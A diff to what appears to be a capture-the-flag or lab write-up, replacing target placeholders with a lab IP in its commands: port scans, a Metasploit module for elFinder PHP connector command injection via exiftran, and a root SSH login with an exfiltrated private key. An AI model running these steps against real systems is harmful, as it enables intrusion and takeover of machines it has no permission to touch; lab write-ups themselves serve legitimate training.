@@ -9,8 +9,8 @@ Linux machine with a login form vulnerable to username enumeration, a file manag
 ### Network Scanning
 
 ```bash
-rustscan -a <target_ip>
-nmap -sC -sV <target_ip>
+rustscan -a 10.64.145.67
+nmap -sC -sV 10.64.145.67
 ```
 
 Open ports:
@@ -54,7 +54,7 @@ Exploit: elFinder PHP connector command injection via `exiftran`.
 ```bash
 msfconsole
 use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
-set RHOSTS <target_ip>
+set RHOSTS 10.64.145.67
 set VHOST <subdomain>
 run
 ```
@@ -97,7 +97,7 @@ The root SSH private key printed to stdout. Saved locally:
 
 ```bash
 chmod 600 root_id_rsa
-ssh -i root_id_rsa root@<target_ip>
+ssh -i root_id_rsa root@10.64.145.67
 ```
 
 ---
